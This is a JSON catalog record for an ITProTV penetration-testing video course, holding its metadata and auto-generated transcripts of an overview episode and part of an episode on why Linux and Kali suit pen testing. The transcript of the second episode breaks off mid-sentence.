{
  "description": "In this series, Daniel and Mike discuss, explain, and demonstrate some of the common tools and techniques used by Penetrations Testers during a security audit. Watch as they explore topics like hacking platforms and test environments, creating BIND/REVERSE shells, discovering and exploiting Buffer Overflows, Cross Site Scripting attacks, Local and Remote File Inclusion attacks, SQL-Injection, Password attacks, Privilege Escalation, and Port Redirection.",
  "descriptionMD": "In this series, Daniel and Mike discuss, explain, and demonstrate some of the common tools and techniques used by Penetrations Testers during a security audit. Watch as they explore topics like hacking platforms and test environments, creating BIND/REVERSE shells, discovering and exploiting Buffer Overflows, Cross Site Scripting attacks, Local and Remote File Inclusion attacks, SQL-Injection, Password attacks, Privilege Escalation, and Port Redirection.",
  "length": "33546",
  "name": "Penetration Testing",
  "practiceExam": false,
  "subtitle": "Tools and techniques for verifying security integrity",
  "tagUrl": "security-admin",
  "topics": [
    {
      "episodes": [
        {
          "description": "In this series, Daniel and Mike discuss, explain, and demonstrate some of the common tools and techniques used by Penetrations Testers during a security audit. Watch as they explore topics like hacking platforms and test environments, creating BIND/REVERSE shells, discovering and exploiting Buffer Overflows, Cross Site Scripting attacks, Local and Remote File Inclusion attacks, SQL-Injection, Password attacks, Privilege Escalation, and Port Redirection.",
          "length": "214",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-0-0-overview-020317-PGM.00_00_03_08.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-0-0-overview-020317-PGM.00_00_03_08.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-0-0-overview-020317-PGM.00_00_03_08.Still001-sm.jpg",
          "title": "Overview",
          "transcript": "WEBVTT\n\n1\n00:00:00.030 --> 00:00:03.591\n[SOUND]\nHello,\n\n2\n00:00:03.591 --> 00:00:09.010\nwe got a new series coming your way\nhere at ITProTV, penetration testing.\n\n3\n00:00:09.010 --> 00:00:13.650\nAnd here to tell us all about it and\nwhat we can expect is Mr Daniel Lowrie.\n\n4\n00:00:13.650 --> 00:00:17.130\n&gt;&gt; Mike, I am so excited about\nthis new series we got coming up.\n\n5\n00:00:17.130 --> 00:00:21.040\nWorked long and hard to bring you guys\na great penetration testing series.\n\n6\n00:00:21.040 --> 00:00:23.760\nGot a lot of really cool techniques and\ntools and\n\n7\n00:00:23.760 --> 00:00:25.360\nthings that we're gonna walk through and\n\n8\n00:00:25.360 --> 00:00:30.220\nshow you guys, that you can properly\npenetration and test your own systems.\n\n9\n00:00:30.220 --> 00:00:32.730\nThat's our great caveat\nwe always like to say.\n\n10\n00:00:32.730 --> 00:00:35.040\nDon't do these things on\nother people's computers.\n\n11\n00:00:35.040 --> 00:00:38.460\nLet me give you a quick rundown on\nsome of the techniques and tools,\n\n12\n00:00:38.460 --> 00:00:41.580\nand items that you might find\nin our series coming up.\n\n13\n00:00:41.580 --> 00:00:43.790\nWe're gonna learn basics of Linux.\n\n14\n00:00:43.790 --> 00:00:47.510\nWe're gonna take a look at Kali Linux\nas a pen-testing platform.\n\n15\n00:00:47.510 --> 00:00:50.220\nWe're gonna use it extensively\nthroughout the series.\n\n16\n00:00:50.220 --> 00:00:53.820\nSo, if you're unfamiliar with Linux you\nget a little bit of a primer there.\n\n17\n00:00:53.820 --> 00:00:57.560\nWe do have a bit of assumed knowledge\nwhen it comes to this level,\n\n18\n00:00:57.560 --> 00:01:01.180\nbecause it is a very high level course.\n\n19\n00:01:01.180 --> 00:01:03.800\nYou do have to have some Linux knowledge.\n\n20\n00:01:03.800 --> 00:01:06.580\nYou do need to have a pretty good\nextensive Windows knowledge.\n\n21\n00:01:06.580 --> 00:01:10.120\nYou will probably need some\nprogramming knowledge as well.\n\n22\n00:01:10.120 --> 00:01:11.030\nSo keep that in mind.\n\n23\n00:01:11.030 --> 00:01:13.660\nThis series is definitely\ngoing to test you.\n\n24\n00:01:13.660 --> 00:01:14.770\nIt's gonna twist you.\n\n25\n00:01:14.770 --> 00:01:18.500\nIt's gonna push you to the edge because\nthere's a lot of advanced techniques and\n\n26\n00:01:18.500 --> 00:01:21.090\nmethodologies that you're\ngonna find throughout.\n\n27\n00:01:21.090 --> 00:01:23.930\nA couple other things that we're gonna\ntake a look at is how to create shells.\n\n28\n00:01:23.930 --> 00:01:27.300\nBind shells, reverse shells,\nvery cool stuff.\n\n29\n00:01:27.300 --> 00:01:30.140\nScanning and\nenumeration tools and techniques.\n\n30\n00:01:30.140 --> 00:01:31.150\nTools are all out there.\n\n31\n00:01:31.150 --> 00:01:34.160\nWe definitely all need to know how\nto do things like end map scans.\n\n32\n00:01:34.160 --> 00:01:38.563\nWork with, I don't know for\nweb scanning, SQL scanning,\n\n33\n00:01:38.563 --> 00:01:42.670\ntons of different types of\nscanning options available for us.\n\n34\n00:01:42.670 --> 00:01:44.420\nWe need to find the flaws right.\n\n35\n00:01:45.570 --> 00:01:49.460\nThen we need to look on writing\ncustom buffer overflows.\n\n36\n00:01:49.460 --> 00:01:52.670\nYes, when I said this gets\na little bit above board\n\n37\n00:01:52.670 --> 00:01:55.282\nthis is where the definitely\nthe metal meets the meat.\n\n38\n00:01:55.282 --> 00:01:58.690\nWe're gonna walk you through a finding,\ncreating, and\n\n39\n00:01:58.690 --> 00:02:03.130\nexploiting a program that is\nvulnerable to a buffer overflow.\n\n40\n00:02:03.130 --> 00:02:05.210\nSo taking you from soup that's on that.\n\n41\n00:02:05.210 --> 00:02:07.030\nWe'll also take a look\nat cross side scripting.\n\n42\n00:02:07.030 --> 00:02:09.485\nA very common technique nowadays.\n\n43\n00:02:09.485 --> 00:02:13.450\nSo you how to implement that so that\nyou might be able to test your systems.\n\n44\n00:02:13.450 --> 00:02:18.580\nContinuing on the line of maybe,\nweb, we have client side attacks,\n\n45\n00:02:18.580 --> 00:02:23.790\nsession hijacking, very dangerous,\nremote and local file inclusions.\n\n46\n00:02:23.790 --> 00:02:28.290\nRFIs, LFIs, if that's how you've\nheard them before, very dangerous.\n\n47\n00:02:28.290 --> 00:02:32.230\nWe'll also look at privilege escalation\nonce we've gained access to the box.\n\n48\n00:02:32.230 --> 00:02:34.210\nMaybe we're not administrators, per se?\n\n49\n00:02:34.210 --> 00:02:36.610\nWe want to bump that privilege up, so\n\n50\n00:02:36.610 --> 00:02:38.510\nwe're gonna use privilege\nescalation techniques for that.\n\n51\n00:02:38.510 --> 00:02:42.070\nWe're gonna take a look at SQL injection,\nbecause if you don't know your SQL\n\n52\n00:02:42.070 --> 00:02:44.870\ninjection, well, then you're coming\nlate to the party ladies and gentleman.\n\n53\n00:02:44.870 --> 00:02:49.520\nSo we're gonna give you a good base\nfoundation knowledge on how to do SQL\n\n54\n00:02:49.520 --> 00:02:53.380\ninjection attacks in\nyour penetration testing.\n\n55\n00:02:53.380 --> 00:02:55.050\nAlso take a look at password cracking.\n\n56\n00:02:55.050 --> 00:02:57.710\nIt's like a day without sunshine if\nwe haven't cracked a password when it\n\n57\n00:02:57.710 --> 00:02:58.810\ncomes to hacking, right?\n\n58\n00:02:58.810 --> 00:03:00.850\nOr penetration testing should I say.\n\n59\n00:03:00.850 --> 00:03:05.090\nAlso looking at network\nservice proof force attacks.\n\n60\n00:03:05.090 --> 00:03:09.360\nAnd finally, port redirection to\nget around those pesky firewalls.\n\n61\n00:03:09.360 --> 00:03:13.320\nSo a lot of really in depth and\nbroad information that\n\n62\n00:03:13.320 --> 00:03:18.140\nshould build you a great foundation for\ndoing your own penetration testing.\n\n63\n00:03:18.140 --> 00:03:21.410\n&gt;&gt; All right, Daniel,\nthose sound like some exciting topics.\n\n64\n00:03:21.410 --> 00:03:25.270\nI'm excited, hopefully everybody\nout there is as excited as I am.\n\n65\n00:03:25.270 --> 00:03:26.390\nCan't wait to get started,\n\n66\n00:03:26.390 --> 00:03:29.840\ncan't wait to see you with us here for\npenetration testing.\n\n67\n00:03:29.840 --> 00:03:34.249\n[SOUND]\n\n",
          "vimeoId": "202942882"
        },
        {
          "description": "In this episode, Dan and Mike go over some of the basic skills used when penetration testing. They also discuss using different platforms to perform penetration testing.",
          "length": "2764",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-1-1-platforms_and_basic_skills-013017-PGM.00_46_10_28.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-1-1-platforms_and_basic_skills-013017-PGM.00_46_10_28.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-1-1-platforms_and_basic_skills-013017-PGM.00_46_10_28.Still001-sm.jpg",
          "title": "Platforms and Basic Skills",
          "transcript": "WEBVTT\n\n1\n00:00:00.270 --> 00:00:01.230\nWelcome to ITProTV.\n\n2\n00:00:01.230 --> 00:00:06.900\nI'm your host [CROSSTALK]\n\n3\n00:00:06.900 --> 00:00:08.015\n[MUSIC]\n\n4\n00:00:08.015 --> 00:00:12.710\n&gt;&gt; You're watching ITProTV.\n\n5\n00:00:12.710 --> 00:00:15.570\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITProTV.\n\n6\n00:00:15.570 --> 00:00:19.660\nI'm your host Mike Rodrick, and\ntoday we're doing penetrating testing.\n\n7\n00:00:19.660 --> 00:00:23.100\nAnd, specifically in this episode, we're\ngonna be taking a look at the different\n\n8\n00:00:23.100 --> 00:00:25.250\nplatforms that we might want to use.\n\n9\n00:00:25.250 --> 00:00:27.680\nAs we're getting into penetration testing.\n\n10\n00:00:27.680 --> 00:00:31.880\nAs well as some of the basic skills, some\nof that foundational knowledge we need\n\n11\n00:00:31.880 --> 00:00:35.690\nto get started in penetration testing and\nwork through the rest of these episodes.\n\n12\n00:00:35.690 --> 00:00:39.180\nAnd here to guide us on our journey,\nto get us started in the world\n\n13\n00:00:39.180 --> 00:00:42.780\nPenetration testing is security guru Mr.\nDaniel Lowrie.\n\n14\n00:00:42.780 --> 00:00:43.470\nWelcome, Daniel.\n\n15\n00:00:43.470 --> 00:00:46.270\n&gt;&gt; Well, thanks for\nthe really high praise there, security.\n\n16\n00:00:46.270 --> 00:00:49.120\nI don't know about security guru but\nI know a thing or two about security.\n\n17\n00:00:49.120 --> 00:00:52.250\nI am so happy to be here though\nthis is going to be a lot of fun.\n\n18\n00:00:52.250 --> 00:00:54.250\nI am really looking\nforward to this series.\n\n19\n00:00:54.250 --> 00:00:55.270\nI hope you guys are as well.\n\n20\n00:00:55.270 --> 00:00:58.670\nWe've worked really hard to bring you\nsome really good hands-on things so\n\n21\n00:00:58.670 --> 00:01:03.130\nthat you can actually implement and\ndo stuff and not just hear about theory.\n\n22\n00:01:03.130 --> 00:01:04.620\nIt's not what we wanna do.\n\n23\n00:01:04.620 --> 00:01:06.980\nThis series is all about\nlet's do something.\n\n24\n00:01:06.980 --> 00:01:09.130\nLet's make stuff happen and I say that and\n\n25\n00:01:09.130 --> 00:01:11.600\nof course our first show\nis mostly about theory.\n\n26\n00:01:11.600 --> 00:01:13.510\nCuz we do have to set the stage, right?\n\n27\n00:01:13.510 --> 00:01:16.130\nAs Mike said we've got to know\nwhat platforms we can use.\n\n28\n00:01:16.130 --> 00:01:17.689\nYou can't just say well I'm a Pentester.\n\n29\n00:01:18.990 --> 00:01:19.620\nWhat do I do?\n\n30\n00:01:19.620 --> 00:01:22.471\nRight, so I gonna give you that's the,\nget the energy going,right?\n\n31\n00:01:22.471 --> 00:01:26.868\nThe first initiation into the four ray,\nthat is pen testing.\n\n32\n00:01:26.868 --> 00:01:28.720\nNow, we say the word pensaas,\n\n33\n00:01:28.720 --> 00:01:30.802\nlets make sure that we are all\non the same page on this.\n\n34\n00:01:30.802 --> 00:01:35.800\nWe mean pen testing, not necessarily,\nyou are a, you can take, what you will be\n\n35\n00:01:35.800 --> 00:01:41.080\nable to take these skills and apply them\nif you are a penetracian tester as a job.\n\n36\n00:01:41.080 --> 00:01:41.900\nThat's what you do.\n\n37\n00:01:41.900 --> 00:01:44.560\nThese are some of the skills that\nyou're probably already doing,\n\n38\n00:01:44.560 --> 00:01:45.470\nif not all of them, right?\n\n39\n00:01:45.470 --> 00:01:46.790\nThat's part of it.\n\n40\n00:01:46.790 --> 00:01:48.570\nIf you want to become\na penetration tester,\n\n41\n00:01:48.570 --> 00:01:53.050\nthis will lay a great foundation for\nyou to get into that field.\n\n42\n00:01:53.050 --> 00:01:56.410\nYou might already be in IT, and\n\n43\n00:01:56.410 --> 00:01:59.430\nif you're watching this you probably are\nin IT, or are at least interested in IT.\n\n44\n00:01:59.430 --> 00:02:01.690\nYou might have some security knowledge.\n\n45\n00:02:01.690 --> 00:02:03.680\nThis is also perfect knowledge for you.\n\n46\n00:02:03.680 --> 00:02:06.450\nWhat we are going to do is teach\nyou things that you can implement\n\n47\n00:02:06.450 --> 00:02:09.590\nas a security professional and then say,\nwe do not have to hire the third party,\n\n48\n00:02:09.590 --> 00:02:11.080\nI can do my own penetration testing.\n\n49\n00:02:11.080 --> 00:02:13.870\nSo, that is kind of the idea of\nwhat this show is all about.\n\n50\n00:02:13.870 --> 00:02:16.480\nThat being said, we do have to start\nwith some foundational knowledge for\n\n51\n00:02:16.480 --> 00:02:19.550\nthose that this might be\ntheir first foray into this.\n\n52\n00:02:19.550 --> 00:02:23.660\nSo let us talk about,\nlet's talk about hacking platforms, right.\n\n53\n00:02:23.660 --> 00:02:27.130\n&gt;&gt; We got a few choices, but I think one\nis gonna stick out above the others,\n\n54\n00:02:27.130 --> 00:02:27.770\nright?\n\n55\n00:02:27.770 --> 00:02:30.800\n&gt;&gt; Yeah, Mike's no slouch when it comes to\nsecurity, the man knows a thing or two,\n\n56\n00:02:30.800 --> 00:02:34.710\nanybody that's watched any of his\nshows here at ItPro.TV will attest to\n\n57\n00:02:34.710 --> 00:02:38.580\nthat very fact, the man is smart and\nhe is right, he gets the gold star.\n\n58\n00:02:38.580 --> 00:02:41.710\nThere are multiple different\nplatforms in which we can use.\n\n59\n00:02:41.710 --> 00:02:44.430\nYou might have a favorite\nout there already.\n\n60\n00:02:44.430 --> 00:02:48.408\nIf one of your favorites is not Linux,\nif your favorite is not Linux,\n\n61\n00:02:48.408 --> 00:02:49.605\nthen well, sorry.\n\n62\n00:02:49.605 --> 00:02:52.085\n[LAUGH] Cuz that's the platform of choice.\n\n63\n00:02:52.085 --> 00:02:59.020\n[LAUGH] I love hearing Mike laugh,\nhe's also our Windows guy around here.\n\n64\n00:02:59.020 --> 00:02:59.690\n&gt;&gt; I am.\n\n65\n00:02:59.690 --> 00:03:00.640\n&gt;&gt; So it's kinda funny.\n\n66\n00:03:00.640 --> 00:03:04.860\n&gt;&gt; But humble enough to understand\nthat Windows has many strengths and\n\n67\n00:03:04.860 --> 00:03:08.880\nmany uses\n&gt;&gt; As a penetration testing platform\n\n68\n00:03:08.880 --> 00:03:09.910\nit's not the strongest.\n\n69\n00:03:09.910 --> 00:03:11.030\n&gt;&gt; Exactly, exactly.\n\n70\n00:03:11.030 --> 00:03:14.390\nAnd that doesn't mean we're not gonna\nuse it, actually quite the contrary,\n\n71\n00:03:14.390 --> 00:03:17.490\nWe are gonna use Windows as a platform for\ncertain things.\n\n72\n00:03:18.720 --> 00:03:20.730\nThat's what really it boils down to.\n\n73\n00:03:20.730 --> 00:03:26.410\nNone of these platforms are any\nQuote unquote better than the other,\n\n74\n00:03:26.410 --> 00:03:28.990\nthey just have an intended use, right?\n\n75\n00:03:28.990 --> 00:03:32.730\nYou don't use a screwdriver\nto put a nail into a board.\n\n76\n00:03:32.730 --> 00:03:34.940\nYou grab a hammer,\ncuz that's what the hammer does.\n\n77\n00:03:34.940 --> 00:03:37.760\nThe same thing applies when it\ncomes to these different platforms.\n\n78\n00:03:37.760 --> 00:03:39.510\nTypically though, most of your tools and\n\n79\n00:03:39.510 --> 00:03:43.170\neverything that we're gonna be looking at,\nWill run in a Linux environment and\n\n80\n00:03:43.170 --> 00:03:48.210\nare created for a Linux environment So we\nare going to spend a lot of time in Linux.\n\n81\n00:03:48.210 --> 00:03:51.280\nSo that is definitely something\nyou're going to have to get used to.\n\n82\n00:03:51.280 --> 00:03:54.150\nIf you're not Linux savvy, guess what?\n\n83\n00:03:54.150 --> 00:03:56.910\nAt ITProTV we have courses on that.\n\n84\n00:03:56.910 --> 00:03:58.010\nJump into our course library.\n\n85\n00:03:58.010 --> 00:03:59.840\nCheck out our Linux courses.\n\n86\n00:03:59.840 --> 00:04:01.810\nThere's phenomenal content in there.\n\n87\n00:04:01.810 --> 00:04:05.680\nSo definitely learn, we are gonna\ntalk about some of the basic basics,\n\n88\n00:04:05.680 --> 00:04:08.280\nthough, just to make sure that\nyou can follow along if you're\n\n89\n00:04:08.280 --> 00:04:09.880\nnot super Linux savvy, though.\n\n90\n00:04:09.880 --> 00:04:13.720\n&gt;&gt; So, Daniel, then Linux is\nthe platform of our choice, okay.\n\n91\n00:04:13.720 --> 00:04:14.470\nTell me why.\n\n92\n00:04:14.470 --> 00:04:16.550\nWhat makes Linux so much better?\n\n93\n00:04:16.550 --> 00:04:18.920\nThen say Windows or Mac.\n\n94\n00:04:18.920 --> 00:04:20.230\n&gt;&gt; Yeah, that's a great question.\n\n95\n00:04:20.230 --> 00:04:22.540\nYou might be going,\nyeah Windows one is rock solid man,\n\n96\n00:04:22.540 --> 00:04:24.150\nit's a great operating system.\n\n97\n00:04:24.150 --> 00:04:26.300\nYou're absolutely correct,\nit is a great operating system.\n\n98\n00:04:26.300 --> 00:04:29.420\nI've run it plenty of times myself.\n\n99\n00:04:29.420 --> 00:04:31.560\nWhy Linux kinda sticks out?\n\n100\n00:04:31.560 --> 00:04:36.060\nIs because for this purpose it's,\n[LAUGH], and we laugh when we say this,\n\n101\n00:04:36.060 --> 00:04:37.180\nease of use, right?\n\n102\n00:04:37.180 --> 00:04:37.680\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n103\n00:04:37.680 --> 00:04:38.460\n&gt;&gt; Mike's, Mike,\n\n104\n00:04:38.460 --> 00:04:42.770\nI can tell you days, he sits behind me in\nour office area, him just, blah, blah,\n\n105\n00:04:42.770 --> 00:04:45.360\nblah, blah, stupid Linux,\nwhy do they do this way?\n\n106\n00:04:45.360 --> 00:04:48.238\nYeah, there are some times,\nI've done it myself, we all do.\n\n107\n00:04:48.238 --> 00:04:49.790\n&gt;&gt; [LAUGH]\n&gt;&gt; Even though I like Linux,\n\n108\n00:04:49.790 --> 00:04:54.440\nI use Linux as a daily driver\n&gt;&gt; It can definitely be frustrating\n\n109\n00:04:54.440 --> 00:04:55.380\nin some sense.\n\n110\n00:04:55.380 --> 00:04:59.510\nBut when it comes to penetration testing,\n\n111\n00:04:59.510 --> 00:05:01.510\nthat's where all the cool kids hang out,\nman.\n\n112\n00:05:01.510 --> 00:05:03.800\nSo what ends up happening?\n\n113\n00:05:03.800 --> 00:05:06.740\nEverything becomes streamlined for\nthat process, right?\n\n114\n00:05:06.740 --> 00:05:09.640\nDoing thing like setting up a web server\n\n115\n00:05:09.640 --> 00:05:11.100\nis not that difficult\nto be honest with you.\n\n116\n00:05:11.100 --> 00:05:14.710\nIt's pretty straightforward and,\nstarting and stopping a web server.\n\n117\n00:05:14.710 --> 00:05:18.050\nUsing it for\nwhatever purposes that you need it for.\n\n118\n00:05:18.050 --> 00:05:19.580\nWhat else?\nProgramming, right?\n\n119\n00:05:19.580 --> 00:05:21.500\nWe're talking penetration testing here,\n\n120\n00:05:21.500 --> 00:05:25.530\nwe're not talking script qd,\nlittle kid stuff.\n\n121\n00:05:25.530 --> 00:05:30.340\nThere is some of that, but we are going\nto get into some really in-depth things,\n\n122\n00:05:30.340 --> 00:05:32.079\nand programming is going\nto be a bit of it.\n\n123\n00:05:33.270 --> 00:05:36.110\nProgramming platforms\nare usually built in to any\n\n124\n00:05:36.110 --> 00:05:37.330\nLinux distribution that you download.\n\n125\n00:05:37.330 --> 00:05:39.130\nRight?\nIt has a C compiler,\n\n126\n00:05:39.130 --> 00:05:43.400\nit's got Python usually,\nprobably Ruby nowadays.\n\n127\n00:05:43.400 --> 00:05:45.770\nPearl is probably baked in as well.\n\n128\n00:05:45.770 --> 00:05:47.490\nBash.\nI did the Bash scripting show if you\n\n129\n00:05:47.490 --> 00:05:48.650\nhaven't seen that.\n\n130\n00:05:48.650 --> 00:05:49.940\nThat show is gonna be a great show,\n\n131\n00:05:49.940 --> 00:05:53.490\nyou might want to watch that between\nus doing this, if you're watching live.\n\n132\n00:05:53.490 --> 00:05:56.690\nIf you haven't, definitely check that out\nbecause I lay out a lot of program and\n\n133\n00:05:56.690 --> 00:05:58.290\nconcepts in there.\n\n134\n00:05:58.290 --> 00:06:02.330\nIt's bash specific but they apply across\nthe board cuz we are gonna talk some\n\n135\n00:06:02.330 --> 00:06:05.050\nprogramming a little bit\nlater down the road.\n\n136\n00:06:05.050 --> 00:06:05.610\nWhat else?\n\n137\n00:06:05.610 --> 00:06:07.410\nThings like FTP, right?\n\n138\n00:06:07.410 --> 00:06:13.610\nSSH, Tony all of these services They\nrun really easily on a Linux platform.\n\n139\n00:06:13.610 --> 00:06:14.890\nAnd again, you got to remember,\n\n140\n00:06:14.890 --> 00:06:17.910\nguys that are doing pen testing they're\nprobably a bit of a programmer themselves.\n\n141\n00:06:17.910 --> 00:06:22.830\nWe're talking devops type of stuff,\nsecurity wrapped around that,\n\n142\n00:06:22.830 --> 00:06:24.750\nso they need to be able to develop.\n\n143\n00:06:24.750 --> 00:06:26.450\nThey need to be able to do it easily.\n\n144\n00:06:26.450 --> 00:06:27.610\nThey need to be able to make it look good.\n\n145\n00:06:27.610 --> 00:06:31.350\nThey need to be able to make it work\nnd not have to fiddle around going\n\n146\n00:06:31.350 --> 00:06:34.180\nwell I gotta install C compiler you know.\n\n147\n00:06:34.180 --> 00:06:35.320\nAnd you get that to happen.\n\n148\n00:06:35.320 --> 00:06:36.870\n&gt;&gt; Exactly.\nAnd Windows for\n\n149\n00:06:36.870 --> 00:06:39.580\nwhat it is, is a great operating\nsystem as Daniel said, but\n\n150\n00:06:39.580 --> 00:06:41.440\nit does hide a lot of\nthings from the end user.\n\n151\n00:06:41.440 --> 00:06:46.710\nAnd that's to make it so usable and\nso user friendly for non IT people.\n\n152\n00:06:46.710 --> 00:06:49.990\nBut in this world that we're getting\ninto in penetration testing,\n\n153\n00:06:49.990 --> 00:06:52.050\nI typically need to see\neverything that's going on.\n\n154\n00:06:52.050 --> 00:06:55.250\nI need to control things in a way that\nsome of those operating systems aren't\n\n155\n00:06:55.250 --> 00:06:56.990\ngonna allow Linux.\n\n156\n00:06:56.990 --> 00:06:59.240\nSome of the complaints there\nare it's difficult to use.\n\n157\n00:06:59.240 --> 00:07:01.040\nYou got to do everything\nfrom the command line.\n\n158\n00:07:01.040 --> 00:07:05.170\nYou got to set every little thing,\nit doesn't do anything for you.\n\n159\n00:07:05.170 --> 00:07:07.610\nThat's exactly what we're looking for\nwhen we're looking for\n\n160\n00:07:07.610 --> 00:07:08.810\nthat pen testing environment.\n\n161\n00:07:08.810 --> 00:07:12.770\nI don't need the operating system changing\nanything, doing anything, hiding anything,\n\n162\n00:07:12.770 --> 00:07:15.920\nbecause that's going to alter my results\nand I'll have to troubleshoot and\n\n163\n00:07:15.920 --> 00:07:21.680\nfigure out why and then I think another\nbig push for Linux is the price, right?\n\n164\n00:07:21.680 --> 00:07:26.690\nAs far as licensing goes, most of our\nLinux distributions are freely available.\n\n165\n00:07:26.690 --> 00:07:30.280\nThey're very open, so we can get in\nthere and customize things ourselves.\n\n166\n00:07:30.280 --> 00:07:34.110\nAnd I think it also lends to\nthe popularity of Linux for this.\n\n167\n00:07:34.110 --> 00:07:34.950\n&gt;&gt; Yeah.\n\n168\n00:07:34.950 --> 00:07:36.070\nAll valid points.\n\n169\n00:07:36.070 --> 00:07:40.350\nMike makes great, fantastic points for\nwhy Linux is the drug of choice.\n\n170\n00:07:40.350 --> 00:07:44.310\nWhen it comes to pen testing,\nsecurity, things of that nature.\n\n171\n00:07:44.310 --> 00:07:47.348\nIt's very open,\nobviously it's open source software.\n\n172\n00:07:47.348 --> 00:07:52.270\nAll of the tools you can get are open so\nif you do go down that road deeply or\n\n173\n00:07:52.270 --> 00:07:57.214\nthe rabbit hole as it were into\ndevelopment and learning programming.\n\n174\n00:07:57.214 --> 00:07:59.001\nYou're just gonna love it.\n\n175\n00:07:59.001 --> 00:08:02.590\nNow, macOS, and we'll kinda get into\nmacOS and Windows here in just a bit.\n\n176\n00:08:02.590 --> 00:08:06.882\nAnd we're gonna continue to harp on Linux,\nbecause that's where we're gonna stay for\n\n177\n00:08:06.882 --> 00:08:08.390\nvast majority of this series.\n\n178\n00:08:11.400 --> 00:08:13.380\nIt's just so well streamlined.\n\n179\n00:08:13.380 --> 00:08:14.580\nAll the stuff is there.\n\n180\n00:08:14.580 --> 00:08:20.218\nYou log in as root, or\nyou sudo into administrative credentials,\n\n181\n00:08:20.218 --> 00:08:22.943\nand it's not gonna balk at you.\n\n182\n00:08:22.943 --> 00:08:24.585\nIt's not gonna say,\nthat's kinda dangerous.\n\n183\n00:08:24.585 --> 00:08:30.000\nIt says, you are the big dog around here,\nthe big cheese, the head honcho.\n\n184\n00:08:30.000 --> 00:08:31.090\nWhatever you say goes.\n\n185\n00:08:31.090 --> 00:08:33.930\nI assume you know what you're doing,\nI'll allow that.\n\n186\n00:08:33.930 --> 00:08:36.740\nSo, another reason a lot of\npeople like to use Linux,\n\n187\n00:08:36.740 --> 00:08:38.199\nit doesn't give me any complaints.\n\n188\n00:08:39.350 --> 00:08:42.410\nI've always heard it said that\nthere's security on one side and\n\n189\n00:08:42.410 --> 00:08:43.760\nease of use on the other.\n\n190\n00:08:43.760 --> 00:08:47.200\nBut it also applies to power,\nto be honest with you, right?\n\n191\n00:08:47.200 --> 00:08:51.370\nWhen you have more power,\nease of use, right,\n\n192\n00:08:51.370 --> 00:08:55.378\nkinda goes by the wayside, because it's\nassuming you want to do everything.\n\n193\n00:08:55.378 --> 00:08:59.251\nA lot of people have complained about\nAndroid devices, for that very reason.\n\n194\n00:08:59.251 --> 00:09:00.432\nIt's got so many options!\n\n195\n00:09:00.432 --> 00:09:02.938\nWell, it assumes that,\nit doesn't assume anything.\n\n196\n00:09:02.938 --> 00:09:06.610\nThat's the only thing that it assumes,\nis that it's not gonna assume anything.\n\n197\n00:09:06.610 --> 00:09:09.610\nIt assumes that you wanna\nset everything that\n\n198\n00:09:09.610 --> 00:09:10.740\nyou wanna set, and\nit's not gonna get in your way.\n\n199\n00:09:10.740 --> 00:09:14.250\nWhereas Apple devices, right,\nthey are very user friendly.\n\n200\n00:09:14.250 --> 00:09:15.810\nYou take grandma and grandpa,\nyou give them an iPhone,\n\n201\n00:09:15.810 --> 00:09:18.795\nthey can almost immediately use\nthe stinking thing, ease of use, right?\n\n202\n00:09:18.795 --> 00:09:21.130\nNow, they've done a pretty good job\nof sandboxing the thing as well.\n\n203\n00:09:21.130 --> 00:09:25.902\nBut typically, you have that\nsliding scale, right, one goes up,\n\n204\n00:09:25.902 --> 00:09:27.421\nthe other goes down.\n\n205\n00:09:27.421 --> 00:09:30.585\nSo when you're working in Linux,\nyes, it can be very, very,\n\n206\n00:09:30.585 --> 00:09:32.550\nvery frustrating at times.\n\n207\n00:09:32.550 --> 00:09:36.450\nBut once you kinda get the hang of\nthings and you just resolve yourself to\n\n208\n00:09:36.450 --> 00:09:40.150\nthe fact that that's the way it's gonna\nbe, then you kinda move on, right?\n\n209\n00:09:40.150 --> 00:09:41.100\nYou get past that little stage.\n\n210\n00:09:41.100 --> 00:09:42.394\n&gt;&gt; All right, now Daniel,\n\n211\n00:09:42.394 --> 00:09:46.909\nwe've been saying Linux, the platform of\nchoice for what we're getting ready to do.\n\n212\n00:09:46.909 --> 00:09:50.211\nBut when we say Linux,\nthere are hundreds, if not thousands,\n\n213\n00:09:50.211 --> 00:09:52.060\nof distributions of Linux.\n\n214\n00:09:52.060 --> 00:09:54.930\nAre there any that lend themselves\nmaybe more towards what\n\n215\n00:09:54.930 --> 00:09:55.560\nwe're getting ready to do?\n\n216\n00:09:55.560 --> 00:09:58.370\nAny in particular that you like or\nrecommend?\n\n217\n00:09:58.370 --> 00:10:01.510\n&gt;&gt; Yeah, totally, there's definitely,\nwe, Kali Linux, right?\n\n218\n00:10:01.510 --> 00:10:07.160\nKali Linux is probably the gold standard\nof penetration testing distributions for\n\n219\n00:10:07.160 --> 00:10:09.680\nLinux, K-A-L-I, Kali.\n\n220\n00:10:09.680 --> 00:10:13.184\nWe actually have a series on\nKali Linux right here on ITProTV.\n\n221\n00:10:13.184 --> 00:10:18.100\nSo we're not gonna do a Kali Linux\nprimer or anything like that.\n\n222\n00:10:18.100 --> 00:10:21.478\nIf you need to know about Kali Linux,\njump into the course library,\n\n223\n00:10:21.478 --> 00:10:24.042\nwatch the Kali Linux show,\nwatch the Linux shows.\n\n224\n00:10:24.042 --> 00:10:26.050\nAnd that's gonna help get you up to speed.\n\n225\n00:10:26.050 --> 00:10:27.890\nIf you're a Linux person, you know Linux,\n\n226\n00:10:27.890 --> 00:10:29.530\nthen you know what I'm talking about,\nright?\n\n227\n00:10:29.530 --> 00:10:30.229\nYou're already there.\n\n228\n00:10:30.229 --> 00:10:35.230\nKali Linux is an extremely\nwell-put-together distribution, and\n\n229\n00:10:35.230 --> 00:10:37.420\nit is geared toward pen testers.\n\n230\n00:10:37.420 --> 00:10:41.910\nIt is geared toward people that want to\nengage into security practices, right?\n\n231\n00:10:41.910 --> 00:10:43.380\nThat's what it's all about.\n\n232\n00:10:43.380 --> 00:10:44.810\nAnd let me tell you 